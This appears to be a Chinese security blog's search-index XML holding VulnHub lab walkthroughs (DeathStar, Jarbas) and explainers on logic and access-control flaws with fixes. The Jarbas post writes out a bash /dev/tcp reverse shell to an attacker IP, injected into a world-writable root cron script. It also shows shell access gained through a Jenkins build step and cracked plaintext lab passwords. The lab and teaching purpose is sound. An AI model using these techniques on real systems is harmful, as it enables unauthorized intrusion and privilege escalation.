<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>靶场实战：DeathStar-1</title>
      <link href="/2025/05/07/DeathStar-1/"/>
      <url>/2025/05/07/DeathStar-1/</url>
      
        <content type="html"><![CDATA[<p>靶场地址：<a href="https://www.vulnhub.com/entry/death-star-1,477/">DeathStar</a></p><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>常规扫描，主机发现<code>sudo nmap -sn 192.168.1.0/24</code><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746629708832.png"><br>192.168.1.115是新增的，为目标靶机ip</p><h3 id="tcp相关方法查找端口"><a href="#tcp相关方法查找端口" class="headerlink" title="tcp相关方法查找端口"></a>tcp相关方法查找端口</h3><p><code>sudo nmap -p- --min-rate=10000 $ip -oA nmapscan/ports</code> 扫描端口开放情况<img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746629895109.png" alt="端口扫描"><br>这边看到端口都是关闭的，选择使用其他的策略来再次进行探测<br><code>sudo nmap -f -p- --min-rate=10000 $ip -oA nmapscan/ports</code>使用-f将tcp包分片，降低被拦截的概率，有些防火墙对分片的处理不完善，可以会成功探测<img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746630139783.png"><br>不过依然没有结果<br><code>sudo nmap --source-port 53 -p- --min-rate=10000 $ip -oA nmapscan/ports</code>将源端口伪装成53，dns，让目标误以为是dns探测从而放行<img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746630300473.png"><br>继续调整策略，使用-r按顺序扫描，因为nmap是随机扫描的<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746630415680.png"><br>扫描到开放了一个10110端口<br><code>sudo nmap -p10110 -sT -sC -sV -O $ip -oA nmapscan/detail</code> 完整扫描-sT使用tcp协议扫描，-sC使用默认脚本，-sV确定版本信息，-O确定目标系统<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746630571113.png"><br>可以看到10110端口只有一个ssh服务，但是没有用户名，爆破也比较困难，暂时不讨论<br>再试一下使用特殊tcp标志号<code>sudo nmap --scanflags URGPSHFIN -p- --min-rate=10000 $ip -oA nmapscan/ports</code>如这里使用URG,PSH,FIN有些防火墙可能会放行流量<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746630892193.png"><br>但是没有什么发现</p><h3 id="查看udp相关"><a href="#查看udp相关" class="headerlink" title="查看udp相关"></a>查看udp相关</h3><p><code>sudo nmap -sU --top-ports 100 $ip -oA nmapscan/udp</code>先看看常用的100个端口<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746631087086.png"><br>没有什么发现，再看看1000个端口<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746631233130.png"><br>该端口是机器获得ip地址对外开放的端口，即使确实是开放的，也没有什么意义。<br>依然没有发现，看看能不能ping通<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746631165212.png"><br>可以ping通，那么我们看看有没有其他交互</p><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>查看网卡信息，然后用<code>tshark -i eth0 -f &quot;host 192.168.1.115&quot;</code>捕捉流量，可以看到确实有流量，我们用-w将其写入，大概一分钟发一次，我们先看看四个包的流量<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746632303367.png"><br><code>tshark -r ds.pcap</code>查看一下，捕捉到4个，2个为一组的循环，使用-V查看详细信息<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746632423914.png"><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746632540120.png"><br>看到里面有一些ascii字符，我们提取出来看看能否得到一些信息<br><code>tshark -r ds.pcap -T fields -e data | tr -d &#39;\n&#39;|xxd -r -p</code><br>命令分解</p><ol><li><p><strong><code>tshark -r ds.pcap -T fields -e data</code></strong></p><ul><li><strong><code>-r ds.pcap</code></strong>：指定输入文件为<code>ds.pcap</code>，即读取捕获的网络数据包文件。</li><li><strong><code>-T fields</code></strong>：设置输出格式为“字段模式”，仅输出指定的字段。</li><li><strong><code>-e data</code></strong>：提取数据包中的应用层负载（Payload），即过滤出<code>data</code>字段内容。</li></ul></li><li><p><strong><code>tr -d &#39;\n&#39;</code></strong></p><ul><li>删除所有换行符（<code>\n</code>），将多行数据拼接为一个连续的字符串，确保后续处理时数据连贯。</li></ul></li><li><p><strong><code>xxd -r -p</code></strong></p><ul><li><strong><code>-r</code></strong>：将十六进制字符串转换为二进制数据（反向操作）。</li><li><strong><code>-p</code></strong>：输入为纯十六进制格式（无偏移量或ASCII字符），输出为原始二进制。</li></ul></li></ol><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746632995946.png"><br>内容是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">在装填时间内获取死星蓝图的代码是：DS-1@OBS</span><br><span class="line"></span><br><span class="line">得益于“Skyhook行动”的成功，义军同盟</span><br><span class="line">获得了一些银河帝国新武器的图纸。我们</span><br><span class="line">知道有一个小开口，可以通过一个直接连接到死星主反应堆的热排气口进行探索。超级激光器需要1440分钟才能装填完毕。</span><br><span class="line">为了获取蓝图，观察“这个窗口”至关重要。</span><br><span class="line">这是因为每60秒只能尝试一次。</span><br></pre></td></tr></table></figure><p>这里出现了两个数字1440,60，猜测是不是刚刚扫描是没有包含这个两个端口，而他们是开放的呢，测试一下<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746633351725.png"><br>可以看到1440的udp是开启的</p><h2 id="2-开始渗透"><a href="#2-开始渗透" class="headerlink" title="2.开始渗透"></a>2.开始渗透</h2><h3 id="nc测试"><a href="#nc测试" class="headerlink" title="nc测试"></a>nc测试</h3><p>尝试用nc连接一下<code>nc -u 192.168.1.115 1440</code>用-u指定udp<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746633492971.png"><br>提到代码，试试刚刚提到的，直接关闭了，再次测试，还是关闭<br>换一个提交方式<code>echo &quot;DS-1@OBS&quot;|nc -u 192.168.1.115 1440 </code>这次有反应，我们保存下来<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746633691957.png"><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746633865967.png"><br>推测是base64，先试试，保存下来，用file查看是什么文件，这边给出是jpg，查看一下，确实是星球大战里的死星，看看有什么可以利用的东西<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746633940269.png" alt="enter description here"></p><h3 id="图片隠写"><a href="#图片隠写" class="headerlink" title="图片隠写"></a>图片隠写</h3><p>先看看图片有没有隠写，尝试使用图片里的197719801983不对，再尝试前面的DS-1@OBS，成功提取<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746634209484.png"><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746634317628.png"></p><pre class="tw-data-text tw-text-large tw-ta" id="tw-target-text">“解锁码”每段只能包含3个字符，按顺序发送即可解锁10110端口。</pre><p>这里是端口敲门技术<br><code>端口敲门</code>是一种隐藏开放端口以防止外部访问的行之有效的方法。 为了启用端口，攻击者会在端口打开之前发送一系列具有某些特征的数据包。<br>但是我们前面扫描时扫到了这个端口，可能扫描时发送的包不小心成功敲门了，可见该技术并不安全，为了完整性，我们还是当做没开来完成一下<br>按照他的要求发送<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746634610233.png"><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746634661930.png"></p><p>根据前面的扫描知道，这里是ssh端口，因为没有用户，我们试试root连接<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746634833631.png"><br>可以交互，但是前面那个密码不对</p><h3 id="信息分析"><a href="#信息分析" class="headerlink" title="信息分析"></a>信息分析</h3><p>这里给出了user： erso，把这段信息交给deepseek<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746635047463.png"><br>尝试Lyra13不对，尝试lyra13成功登录<br>再往后就是个pwn的题了，这里有题解<a href="https://medium.com/@vinit.patil2790/deathstar-vulnhub-walkthrough-d0cd71ba9664">deathstar-vulnhub-walkthrough</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>是个很有趣的题，结合了星球大战的很多内容，端口服务基本都探测不到什么有用的，最后用了流量分析才找到东西，最后拿到ssh用户了居然还需要完成一个pwn题的内容。</p>]]></content>
      
      
      <categories>
          
          <category> 靶场实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux提权 </tag>
            
            <tag> vulnhub靶场 </tag>
            
            <tag> 靶场实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逻辑漏洞产生原理及利用</title>
      <link href="/2025/05/04/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/05/04/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="1-验证码漏洞"><a href="#1-验证码漏洞" class="headerlink" title="1 验证码漏洞"></a>1 验证码漏洞</h2><h3 id="产生原理"><a href="#产生原理" class="headerlink" title="产生原理"></a>产生原理</h3><ol><li><strong>验证码未失效</strong>：同一验证码可多次使用，或未设置超时限制。</li><li><strong>验证码与用户未绑定</strong>：未与手机号&#x2F;邮箱关联，导致可被劫持或篡改。</li><li><strong>验证码回显</strong>：验证码明文返回至前端或数据包中。</li><li><strong>分步校验</strong>：验证码校验与后续操作未绑定，导致绕过。</li></ol><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><ul><li><p><strong>爆破&#x2F;重放</strong>：通过Burp Suite等工具对验证码进行爆破或重放请求 。</p></li><li><p><strong>劫持验证码</strong>：修改数据包中的手机号&#x2F;邮箱参数，将验证码发送至攻击者设备 。</p></li></ul><h3 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h3><ul><li><strong>绑定用户信息</strong>：验证码需与用户身份（如Session ID）绑定。</li><li><strong>时效性限制</strong>：设置单次有效且超时失效（如5分钟）。</li><li><strong>加密传输</strong>：验证码凭证需加密且不返回前端</li></ul><h2 id="2-密码找回漏洞"><a href="#2-密码找回漏洞" class="headerlink" title="2 密码找回漏洞"></a>2 密码找回漏洞</h2><h3 id="产生原理-1"><a href="#产生原理-1" class="headerlink" title="产生原理"></a>产生原理</h3><ol><li><p><strong>验证步骤缺失</strong>：未校验用户身份与验证码的绑定关系。</p></li><li><p><strong>凭证泄露</strong>：重置密码的Token或链接可被预测或截获。</p></li><li><p><strong>分步逻辑缺陷</strong>：跳过验证步骤直接进入密码修改页面 。</p></li></ol><h3 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h3><ul><li><p><strong>篡改参数</strong>：修改数据包中的手机号或邮箱，劫持他人验证码。</p></li><li><p><strong>Token爆破</strong>：利用弱随机性生成的Token进行枚举 。</p></li></ul><h3 id="修复方法-1"><a href="#修复方法-1" class="headerlink" title="修复方法"></a>修复方法</h3><ul><li><strong>多因素校验</strong>：结合短信验证码、邮箱验证和用户身份信息。</li><li><strong>随机Token</strong>：使用强随机算法生成一次性Token，并绑定用户IP</li></ul><h2 id="3-支付逻辑漏洞"><a href="#3-支付逻辑漏洞" class="headerlink" title="3 支付逻辑漏洞"></a>3 支付逻辑漏洞</h2><h3 id="产生原理-2"><a href="#产生原理-2" class="headerlink" title="产生原理"></a>产生原理</h3><ol><li><p><strong>金额篡改</strong>：前端提交金额未与服务端校验，允许负数或超额。</p></li><li><p><strong>竞争条件</strong>：并发请求绕过库存或余额校验（如多次支付仅扣款一次）。</p></li><li><p><strong>订单替换</strong>：修改订单ID或商品参数，低价购买高价商品 。</p></li></ol><h3 id="利用方式-2"><a href="#利用方式-2" class="headerlink" title="利用方式"></a>利用方式</h3><ul><li><p><strong>篡改金额参数</strong>：修改数据包中的<code>amount</code>、<code>price</code>等字段。</p></li><li><p><strong>并发请求攻击</strong>：利用Burp Suite多线程发送支付请求 。</p></li></ul><h3 id="修复方法-2"><a href="#修复方法-2" class="headerlink" title="修复方法"></a>修复方法</h3><ul><li><p><strong>服务端校验</strong>：重新计算订单金额，禁止依赖前端提交的数据。</p></li><li><p><strong>事务锁机制</strong>：使用数据库事务锁或分布式锁防止竞争条件 .</p></li></ul><h2 id="4、业务数据篡改"><a href="#4、业务数据篡改" class="headerlink" title="4、业务数据篡改"></a>4、业务数据篡改</h2><h3 id="产生原理-3"><a href="#产生原理-3" class="headerlink" title="产生原理"></a>产生原理</h3><ol><li><p><strong>参数可预测</strong>：商品ID、订单号等参数规律性强，可遍历或猜测。</p></li><li><p><strong>客户端信任过度</strong>：依赖前端校验，未在服务端验证数据合法性 。</p></li></ol><h4 id="利用方式-3"><a href="#利用方式-3" class="headerlink" title="利用方式"></a>利用方式</h4><ul><li><p><strong>遍历参数</strong>：修改商品ID或订单号，获取未授权数据。</p></li><li><p><strong>负数攻击</strong>：提交负数库存或金额，导致逻辑错误（如余额增加）。</p></li></ul><h4 id="修复方法-3"><a href="#修复方法-3" class="headerlink" title="修复方法"></a>修复方法</h4><ul><li><p><strong>数据签名</strong>：对关键参数附加哈希签名，防止篡改。</p></li><li><p><strong>服务端验证</strong>：校验参数合法性（如数值范围、格式） 。</p></li></ul><h2 id="5、会话固定与会话劫持"><a href="#5、会话固定与会话劫持" class="headerlink" title="5、会话固定与会话劫持"></a>5、会话固定与会话劫持</h2><h3 id="产生原理-4"><a href="#产生原理-4" class="headerlink" title="产生原理"></a>产生原理</h3><ol><li><p><strong>Session固定</strong>：登录前后Session ID不变，攻击者可预置Session诱导用户登录。</p></li><li><p><strong>Cookie未加密</strong>：Cookie中存储明文身份信息，可被篡改 。</p></li></ol><h3 id="利用方式-4"><a href="#利用方式-4" class="headerlink" title="利用方式"></a>利用方式</h3><ul><li><p><strong>诱导登录</strong>：发送带有固定Session ID的链接给用户。</p></li><li><p><strong>Cookie伪造</strong>：修改Cookie中的<code>user_id</code>或<code>role</code>字段 。</p></li></ul><h3 id="修复方法-4"><a href="#修复方法-4" class="headerlink" title="修复方法"></a>修复方法</h3><ul><li><p><strong>登录后更新Session</strong>：用户认证成功后生成新Session ID。</p></li><li><p><strong>HttpOnly &amp; Secure标记</strong>：防止XSS窃取Cookie，强制HTTPS传输 。</p></li></ul><h2 id="6、短信-邮件轰炸"><a href="#6、短信-邮件轰炸" class="headerlink" title="6、短信&#x2F;邮件轰炸"></a>6、短信&#x2F;邮件轰炸</h2><h3 id="产生原理-5"><a href="#产生原理-5" class="headerlink" title="产生原理"></a>产生原理</h3><ol><li><p><strong>无频率限制</strong>：未限制同一手机号&#x2F;邮箱的发送次数。</p></li><li><p><strong>接口暴露</strong>：短信发送接口未鉴权，可被恶意调用 。</p></li></ol><h3 id="利用方式-5"><a href="#利用方式-5" class="headerlink" title="利用方式"></a>利用方式</h3><ul><li><p><strong>重放攻击</strong>：多次发送同一请求导致目标设备接收大量短信。</p></li><li><p><strong>参数遍历</strong>：修改手机号末位或添加特殊符号绕过限制（如<code>1380013800+1</code>） 。</p></li></ul><h4 id="修复方法-5"><a href="#修复方法-5" class="headerlink" title="修复方法"></a>修复方法</h4><ul><li><p><strong>频率控制</strong>：限制同一用户&#x2F;IP的发送频率（如每分钟1次）。</p></li><li><p><strong>图形验证码</strong>：高风险操作前需通过人机验证 。</p></li></ul><h2 id="7、条件竞争漏洞（Race-Condition）"><a href="#7、条件竞争漏洞（Race-Condition）" class="headerlink" title="7、条件竞争漏洞（Race Condition）"></a>7、条件竞争漏洞（Race Condition）</h2><h3 id="产生原理-6"><a href="#产生原理-6" class="headerlink" title="产生原理"></a>产生原理</h3><p>多线程并发操作未加锁，导致数据不一致（如余额检查与扣款分离）。</p><h3 id="利用方式-6"><a href="#利用方式-6" class="headerlink" title="利用方式"></a>利用方式</h3><ul><li><strong>并发请求</strong>：同时发起多次支付或提现请求，绕过余额校验。</li></ul><h3 id="修复方法-6"><a href="#修复方法-6" class="headerlink" title="修复方法"></a>修复方法</h3><ul><li><p><strong>数据库锁机制</strong>：使用悲观锁或乐观锁控制并发。</p></li><li><p><strong>原子操作</strong>：将余额检查与扣款合并为事务操作 .</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-web </tag>
            
            <tag> 逻辑漏洞 </tag>
            
            <tag> 漏洞修复 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶场实战： jarbas</title>
      <link href="/2025/05/04/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9A%20jarbas/"/>
      <url>/2025/05/04/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%9A%20jarbas/</url>
      
        <content type="html"><![CDATA[<p>靶机地址<br><a href="https://www.vulnhub.com/entry/jarbas-1,232/">jarbas</a></p><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p><code>sudo nmap -sn 192.168.1.0/24</code><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746716967995.png"><br>192.168.1.112是新出现的ip，确定为目标</p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><code>sudo nmap -p- --min-rate=10000 $ip -oA nmapscan/ports</code><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746717176666.png"><br>开放了22,80,3306,8080端口，看一下细节<code>sudo nmap -sT -sC -sV -O $ip -p22,80,3306,8080 -oA nmapscan/detail</code><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746717408936.png"><br>80端口是php，8080端口可能存在robots.txt文件泄露<br>再看看默认的漏洞脚本扫描的结果<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746717539065.png"><br>80端口可能有sql注入，8080端口有robots.txt的文件泄露，我们先看看。<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746717634653.png"></p><pre># we don't want robots to click "build" links</pre>我们不希望机器人点击build链接<p>80端口是jarbas<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746717817194.png"><br>8080端口是一个jenkins的登录页面<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746717768949.png"></p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746718039911.png"><br>指定文件结尾时出现了一个access.html看看是什么<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746718126850.png"></p><h2 id="2-开始渗透"><a href="#2-开始渗透" class="headerlink" title="2.开始渗透"></a>2.开始渗透</h2><h3 id="md5碰撞"><a href="#md5碰撞" class="headerlink" title="md5碰撞"></a>md5碰撞</h3><p>刚刚的东西猜测是用户名加密码，密码应该是MD5，用hash-identifier看看<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746718183883.png"><br>果然是md5，用一些碰撞软件解密一下，john和网站都可以尝试一下<br>在<a href="https://hashes.com/en/decrypt/hash">hash cracker</a>找到了，把john停下来<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746718614909.png"><br>现在的信息是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tiago: italia99</span><br><span class="line">trindade : vipsu</span><br><span class="line">eder : marianna</span><br></pre></td></tr></table></figure><p>尝试登录8080的页面，最终使用eder&#x2F;vipsu登录成功<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746719259286.png"></p><p>先了解一下jenkins这个cms：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Jenkins是一款开源的持续集成（CI）和持续交付（CD）工具，基于Java开发，广泛应用于自动化软件构建、测试、部署等流程。</span><br><span class="line">以下是其核心功能与特点的综合说明：</span><br><span class="line">核心功能持续集成与持续交付（CI/CD）Jenkins的核心作用是实现代码的持续集成与交付。当开发者提交代码到版本控制系统（如Git）时，Jenkins可自动触发构建流程，包括编译、测试、打包等步骤，并将结果反馈给开发者。若测试通过，还可进一步自动化部署到生产环境。</span><br><span class="line">自动化构建与测试支持通过Maven、Gradle等工具进行代码编译，并集成单元测试、代码质量检查（如SonarQube）等环节，确保每次代码变更后的质量。</span><br><span class="line">插件化扩展Jenkins拥有超过1000个插件，覆盖版本控制（Git/SVN）、构建工具、部署目标（如Docker、Kubernetes）、通知（邮件、钉钉）等功能，几乎能与所有主流的开发工具链集成。</span><br><span class="line">分布式构建支持主从架构（Master/Agent），可在多台服务器上并行执行任务，提升构建效率并降低单点负载压力。</span><br></pre></td></tr></table></figure><h3 id="jenkins-getshell"><a href="#jenkins-getshell" class="headerlink" title="jenkins getshell"></a>jenkins getshell</h3><p>新建项目-&gt; 选择freestyle project -&gt; 下滑到build 选择执行shell（execute shell),尝试一下反弹shell<br>在<a href="https://forum.ywhack.com/shell.php">生成反弹命令</a>生成一个shell的反弹命令<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746720076948.png"><br>保存之后，本地起一个监听窗口<code>nc -lvvp 5555</code>然后点击网页的build now<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746720135341.png"><br>成功拿到web用户权限</p><h2 id="3-权限提升"><a href="#3-权限提升" class="headerlink" title="3.权限提升"></a>3.权限提升</h2><h3 id="suid-sudo提权"><a href="#suid-sudo提权" class="headerlink" title="suid&#x2F;sudo提权"></a>suid&#x2F;sudo提权</h3><p>尝试sudo提权，suid提权，应该都没有希望<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746720355685.png"><br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746720469830.png"><br>查看passwd文件，得到有远程登录的只有root用户和eder用户<br>尝试前面得到的密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tiago: italia99</span><br><span class="line">trindade : vipsu</span><br><span class="line">eder : marianna</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746720600402.png"><br>无果</p><h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><p>看看定时任务之类的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab #较为常用 </span><br><span class="line">cat /etc/cron.d #比较少用</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746720691549.png"><br>root用户每五分钟会执行这个文件&#x2F;etc&#x2F;script&#x2F;CleaningScript.sh，看看权限<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746720741255.png"><br>所有用户可读可写可执行，这不就是让我们写shell嘛，直接反弹命令安排上<br><code>echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.1.114/6666 0&gt;&amp;1&quot; &gt; /etc/script/CleaningScript.sh</code><br>查看一下对不对<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746720951602.png"><br>可以，起一个监听服务<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746720987166.png"><br>成功拿到root权限，看看有没有flag啥的<br><img src="https://raw.githubusercontent.com/ta3shi/image/main/shujiang/1746721048899.png"><br>结束</p>]]></content>
      
      
      <categories>
          
          <category> 靶场实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-web </tag>
            
            <tag> 逻辑漏洞 </tag>
            
            <tag> 漏洞修复 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>越权漏洞原理及利用</title>
      <link href="/2025/05/04/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/05/04/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>越权漏洞是指应用程序未对当前用户操作的身份权限进行严格校验，导致用户可以操作超出自己管理权限范围的功能，从而操作一些非该用户可以操作的行为。<strong>简单来说，就是攻击者可以做一些本来不该他们做的事情（增删改查）</strong>。</p><h2 id="1-形成原理"><a href="#1-形成原理" class="headerlink" title="1.形成原理"></a>1.形成原理</h2><ol><li><p>​<strong>​权限验证缺失​</strong>​</p><ul><li><p>系统未对用户操作进行严格的身份与权限校验，仅依赖前端参数（如URL中的用户ID、订单ID）判断权限</p><p>。例如，查询订单时直接使用用户提交的<code>orderid</code>而未验证其归属权，导致攻击者可遍历ID获取他人数据。</p></li><li><p>服务端未在关键操作（如增删改查）前二次验证用户身份，例如修改密码时仅验证第一步的短信验证码，未在第二步确认用户身份。</p></li></ul></li><li><p>​<strong>​参数可控性漏洞​</strong>​</p><ul><li>用户可控参数（如Cookie、GET&#x2F;POST参数）被直接用于权限判断。例如，Apache Superset的默认<code>secret_key</code>泄露后，攻击者伪造Cookie绕过身份验证。</li></ul></li><li><p>​<strong>​会话管理缺陷​</strong>​</p><ul><li>Session未正确绑定用户身份与权限层级，或Cookie中存储明文权限标识（如<code>isadmin=1</code>），攻击者可篡改权限标识实现垂直越权。</li></ul></li><li><p>​<strong>​业务逻辑设计缺陷​</strong>​</p><ul><li><p>多阶段业务流程未全程校验权限。例如文件下载功能仅在前端隐藏URL，未在服务端验证用户是否付费。</p></li><li><p>目录遍历漏洞（如通过<code>../</code>访问管理员接口）或未授权访问（如直接输入管理页面URL）。</p></li></ul></li></ol><h2 id="2-分类"><a href="#2-分类" class="headerlink" title="2.分类"></a>2.分类</h2><h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><p>发生在具有相同权限级别的用户之间。攻击者通过利用这些漏洞，访问其他用户拥有的资源或执行与其权限级别不符的操作。</p><h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>发生在具有多个权限级别的系统中。攻击者通过利用这些漏洞，从一个低权限级别跳转到一个更高的权限级别。例如，攻击者从普通用户身份成功跃迁为管理员。</p><h2 id="3-修复"><a href="#3-修复" class="headerlink" title="3.修复"></a>3.修复</h2><p>越权漏洞的形成原理与修复方法可总结如下：</p><ol><li><p>​<strong>​权限校验强化​</strong>​</p><ul><li><p>​<strong>​服务端验证​</strong>​：所有权限判断应在服务端完成，避免依赖前端参数。例如，通过Session获取当前用户ID，而非从请求参数中提取。</p></li><li><p>​<strong>​最小权限原则​</strong>​：用户仅分配完成操作所需的最小权限，避免权限泛化。</p></li></ul></li><li><p>​<strong>​参数安全处理​</strong>​</p><ul><li><p>​<strong>​加密敏感参数​</strong>​：对资源ID（如订单号、文件ID）进行加密或哈希处理，防止遍历攻击。</p></li><li><p>​<strong>​输入合法性校验​</strong>​：对用户输入的参数进行格式、范围校验，例如限制ID为数字且属于当前用户。</p></li></ul></li><li><p>​<strong>​会话与身份管理​</strong>​</p><ul><li><p>​<strong>​绑定Session与权限​</strong>​：登录后，将用户角色、权限信息存储在服务端Session中，关键操作时校验权限层级。</p></li><li><p>​<strong>​敏感操作二次验证​</strong>​：如修改密码、支付等操作需重新输入密码或验证码。</p></li></ul></li><li><p>​<strong>​业务逻辑加固​</strong>​</p><ul><li><p>​<strong>​接口鉴权​</strong>​：为每个功能接口定义权限码，通过AOP切面统一校验用户权限。例如，使用注解<code>@FunctionAuth</code>标记接口所需权限。</p></li><li><p>​<strong>​访问控制策略​</strong>​：限制未授权路径访问。例如，管理员接口需校验用户角色，并避免通过URL路径跳转绕过（如<code>/admin/../user</code>）。</p></li></ul></li><li><p>​<strong>​安全框架与工具​</strong>​</p><ul><li><p>​<strong>​使用成熟权限框架​</strong>​：如Spring Security、Shiro，实现角色-资源-操作的动态权限管理。</p></li><li><p>​<strong>​日志与监控​</strong>​：记录敏感操作日志，实时检测异常请求（如频繁遍历ID）。</p></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web渗透 </tag>
            
            <tag> ctf-web </tag>
            
            <tag> 越权漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶场实战：devguru</title>
      <link href="/2025/05/03/devguru-1/"/>
      <url>/2025/05/03/devguru-1/</url>
      
